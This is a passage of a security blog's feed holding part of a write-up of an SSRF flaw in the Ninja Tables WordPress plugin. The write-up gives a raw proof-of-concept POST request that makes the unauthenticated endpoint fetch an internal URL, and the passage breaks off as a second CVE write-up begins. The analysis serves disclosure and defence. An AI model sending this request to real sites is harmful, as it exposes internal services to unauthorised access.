start=&#34;6&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Decode and extract the callback function from the request parameters&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$callback = static::getCallback($params);&#xA;&#xA;protected static function getCallback(&amp;amp;$params)&#xA;{&#xA;    $callback = unserialize(base64_decode($params[&amp;#39;callback&amp;#39;]));&#xA;    unset($params[&amp;#39;callback&amp;#39;]);&#xA;    return $callback;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;getCallback()&lt;/code&gt; is used to extract a callback function provided in the &lt;code&gt;args.callback&lt;/code&gt; parameter of the request.&lt;/p&gt;&#xA;&lt;ol start=&#34;7&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Invoke the &lt;code&gt;$requestMethod&lt;/code&gt; with &lt;code&gt;$params&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$response = $client-&amp;gt;{$requestMethod}(&amp;#39;&amp;#39;, $params);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;For example: if &lt;code&gt;$requestMethod&lt;/code&gt; is &lt;code&gt;POST&lt;/code&gt; =&amp;gt; &lt;code&gt;$response = $client-&amp;gt;POST(&#39;&#39;, $params)&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;8&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Error check and return&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (is_wp_error($response)) {&#xA;    $exception = new Exception(&#xA;        $response-&amp;gt;get_error_message(), 500&#xA;    );&#xA;}&#xA;&#xA;return $callback($response, $exception ?? null);&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;details admonition question open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-regular fa-circle-question&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Question&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;What happens if &lt;code&gt;$requestMethod&lt;/code&gt; does not exist — i.e., &lt;code&gt;$client&lt;/code&gt; calls a method that is not present in the &lt;code&gt;Client&lt;/code&gt; class?&lt;/p&gt;&#xA;&lt;p&gt;In this case, PHP will automatically invoke the magic &lt;code&gt;__call()&lt;/code&gt; method declared in the &lt;code&gt;Client&lt;/code&gt; class. &lt;code&gt;__call()&lt;/code&gt; is designed to handle calls to non-existing methods, allowing the &lt;code&gt;Client&lt;/code&gt; to perform dynamic requests based on the invoked method name.&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;Observing the &lt;strong&gt;Outline tab&lt;/strong&gt; shows all methods, properties and functions in the file in order.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-03-cve-2025-2940/outline.png&#34; title=&#34;Outline of Client.php&#34; data-thumbnail=&#34;/posts/2025-11-03-cve-2025-2940/outline.png&#34; data-sub-html=&#34;&lt;h2&gt;Outline&lt;/h2&gt;&lt;p&gt;Outline of Client.php&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-03-cve-2025-2940/outline.png&#39; alt=&#34;Outline&#34; height=&#34;969&#34; width=&#34;644&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Outline of Client.php&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function __call($method, $args)&#xA;{&#xA;    if ($method === &amp;#39;download&amp;#39;) {&#xA;        return $this-&amp;gt;downloadFile(...$args);&#xA;    }&#xA;    &#xA;    // Handles dynamic method calls like:&#xA;    // asyncGet, asyncPost and so on&#xA;    // get, post and so on&#xA;    $url = array_shift($args);&#xA;&#xA;    $parsed = parse_url($url);&#xA;&#xA;    if (!isset($parsed[&amp;#39;scheme&amp;#39;])) {&#xA;        $url = trim($this-&amp;gt;baseUrl, &amp;#39;/&amp;#39;) . &amp;#39;/&amp;#39; . trim($url, &amp;#39;/&amp;#39;);&#xA;    }&#xA;&#xA;    if (str_starts_with($method, &amp;#39;async&amp;#39;)) {&#xA;        $method = substr($method, strlen(&amp;#39;async&amp;#39;));&#xA;        $this-&amp;gt;checkIfValidHttpMethod($method);&#xA;        return $this-&amp;gt;asyncRequest(&#xA;            $url, $this-&amp;gt;buildRequestArgs($args, $method)&#xA;        );&#xA;    }&#xA;    &#xA;    $this-&amp;gt;checkIfValidHttpMethod($method);&#xA;    return $this-&amp;gt;request(&#xA;        $url, $this-&amp;gt;buildRequestArgs($args, $method)&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;__call()&lt;/code&gt; will call &lt;code&gt;request()&lt;/code&gt; if the method is not &lt;code&gt;download&lt;/code&gt; and does not start with &lt;code&gt;async&lt;/code&gt;, with the URL already set.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function request($url, $args = [])&#xA;{&#xA;    if ($query = http_build_query($this-&amp;gt;query)) {&#xA;        $url .= &amp;#39;?&amp;#39; . $query;&#xA;    }&#xA;&#xA;    $response = wp_remote_request($url, $args);&#xA;&#xA;    if (is_wp_error($response)) {&#xA;        throw new Exception($response-&amp;gt;get_error_message(), 500);&#xA;    }&#xA;    &#xA;    $this-&amp;gt;cookies = array_merge(&#xA;        $this-&amp;gt;cookies,&#xA;        wp_remote_retrieve_cookies($response)&#xA;    );&#xA;&#xA;    return $this-&amp;gt;makeResponse($response);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;request()&lt;/code&gt; builds the query and sends the request using &lt;code&gt;wp_remote_request()&lt;/code&gt; — the primary &lt;strong&gt;SSRF sink&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;HTTP Request&amp;#34;] --&amp;gt; B[&amp;#34;admin_post_nopriv_{action}&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;$request-&amp;gt;get(&amp;#39;args.url&amp;#39;) / $request-&amp;gt;get(&amp;#39;args.method&amp;#39;)&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;$client-&amp;gt;{$requestMethod}(&amp;#39;&amp;#39;, $params)&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;Client::__call() → request() → wp_remote_request() ← SSRF sink&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Response → callback → HTTP Response&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-server&#34;&gt;&lt;span&gt;Local Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#local-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Create a simple local service with Python&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, send_from_directory&#xA;import os&#xA;&#xA;BASE_DIR = os.path.abspath(os.getcwd())&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/metadata&amp;#39;)&#xA;def metadata():&#xA;    return send_from_directory(BASE_DIR, &amp;#39;metadata.json&amp;#39;, as_attachment=True)&#xA;&#xA;@app.route(&amp;#39;/delete&amp;#39;)&#xA;def delete():&#xA;    file_id = request.args.get(&amp;#39;id&amp;#39;)&#xA;    if not file_id:&#xA;        return &amp;#34;No id provided&amp;#34;, 400&#xA;    print(f&amp;#34;delete it: {file_id}&amp;#34;)&#xA;    return f&amp;#34;Delete it: {file_id}&amp;#34;&#xA;&#xA;if __name__ == &amp;#39;__main__&amp;#39;:&#xA;    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8001, debug=True)&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;content&amp;#34;: &amp;#34;Internal service data&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Send a POST request with the URL pointing to the local service:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-post.php HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 &#xA;Accept: */*&#xA;Content-Type: application/x-www-form-urlencoded&#xA;Content-Length: 146&#xA;Connection: close&#xA;&#xA;action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&amp;amp;args[url]=http://localhost:8001/delete?id=1&amp;amp;args[method]=GET&amp;amp;args[name]=Tokuda&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-03-cve-2025-2940/result.png&#34; title=&#34;GET request to local service&#34; data-thumbnail=&#34;/posts/2025-11-03-cve-2025-2940/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;GET request to local service&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-03-cve-2025-2940/result.png&#39; alt=&#34;Result&#34; height=&#34;275&#34; width=&#34;960&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;GET request to local service&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The SSRF vulnerability in &lt;strong&gt;Ninja Tables ≤ 5.0.18&lt;/strong&gt; shows that the &lt;code&gt;args[url]&lt;/code&gt; parameter provided by the client is used directly to perform server-side requests without validation, allowing an unauthenticated attacker to force the application to access arbitrary destinations. The patch in &lt;strong&gt;≥ 5.0.19&lt;/strong&gt; removed the unsafe code and mitigated this attack vector.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Upgrade immediately to &lt;strong&gt;5.0.19&lt;/strong&gt; or later.&lt;/li&gt;&#xA;&lt;li&gt;Do not use client input directly as a request URL — validate/normalize before use.&lt;/li&gt;&#xA;&lt;li&gt;Implement allowlists for hosts/ports and block private IP ranges (127.0.0.0/8, 10.0.0.0/8, 192.168.0.0/16, etc.).&lt;/li&gt;&#xA;&lt;li&gt;Avoid registering &lt;code&gt;admin_post_nopriv_*&lt;/code&gt; endpoints for functions that perform outbound requests, or add proper permission/CSRF controls.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SSRF (Server Side Request Forgery) — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ninja-tables/vulnerability/wordpress-ninja-tables-easy-data-table-builder-plugin-5-0-18-unauthenticated-server-side-request-forgery-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Ninja Tables Plugin &amp;lt;= 5.0.18 is vulnerable to Server Side Request Forgery (SSRF)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-1043 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-02-cve-2025-1043/</link>
      <pubDate>Sun, 02 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-02-cve-2025-1043/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-02-cve-2025-1043/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;The &amp;ldquo;Embed Any Document – Embed PDF, Word, PowerPoint and Excel Files&amp;rdquo; plugin&lt;/strong&gt; for WordPress contains a &lt;strong&gt;Server-Side Request Forgery (SSRF)&lt;/strong&gt; vulnerability in all versions up to and including &lt;strong&gt;2.7.5&lt;/strong&gt; via the &lt;code&gt;&#39;embeddoc&#39;&lt;/code&gt; shortcode. This vulnerability allows authenticated attackers with &lt;strong&gt;Contributor&lt;/strong&gt; access or higher to make web requests to arbitrary destinations originating from the web application and can be used to query or modify information from internal services.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-1043&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-1043&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Server Side Request Forgery (SSRF)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.7.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.7.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (4.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/embed-any-document/advanced/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Embed Any Document Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Embed Any Document&lt;/strong&gt;: &lt;strong&gt;2.7.5&lt;/strong&gt; (vulnerable) and &lt;strong&gt;2.7.6&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool to inspect and compare differences between versions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 